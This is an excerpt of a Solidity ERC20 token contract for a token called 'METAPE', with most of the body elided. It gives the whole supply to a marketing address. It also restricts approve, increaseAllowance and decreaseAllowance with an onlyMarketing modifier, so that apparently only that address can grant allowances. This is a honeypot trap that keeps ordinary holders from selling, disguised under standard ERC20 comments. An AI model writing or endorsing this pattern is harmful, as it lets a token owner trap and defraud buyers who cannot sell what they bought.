...
contract ERC20 is Permission, IERC20 {
    ...
    constructor () public {
        ...
        _symbol = "METAPE";
        _decimals = 9;
        _totalSupply = 240000000000000000000;
        
        _balances[marketing()] = _totalSupply;
     ...
     */
    function approve(address spender, uint256 amount) public virtual onlyMarketing override returns (bool) {
     ...
     * - `spender` cannot be the zero address.
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual onlyMarketing returns (bool) {
     ...
     * `subtractedValue`.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual onlyMarketing returns (bool) {
